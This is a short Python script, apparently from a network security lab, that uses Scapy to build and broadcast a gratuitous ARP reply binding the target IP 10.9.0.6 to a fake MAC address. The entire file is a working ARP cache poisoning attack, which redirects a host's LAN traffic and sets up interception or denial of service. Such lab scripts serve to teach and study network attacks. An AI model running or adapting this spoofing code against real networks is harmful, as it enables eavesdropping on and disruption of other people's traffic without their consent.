#!/usr/bin/env python3
from scapy.all import *

IP_V       = "10.9.0.5"
MAC_V_real = "02:42:0a:09:00:05"

IP_T       = "10.9.0.6"
MAC_T_fake = "02:42:0a:09:00:69"

# Constructing Gratuitous ARP packet
ether  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp    = ARP(psrc = IP_T, pdst  = IP_T, hwsrc = MAC_T_fake, hwdst = "ff:ff:ff:ff:ff:ff")
arp.op = 2   # Reply

frame  = ether/arp
sendp(frame)

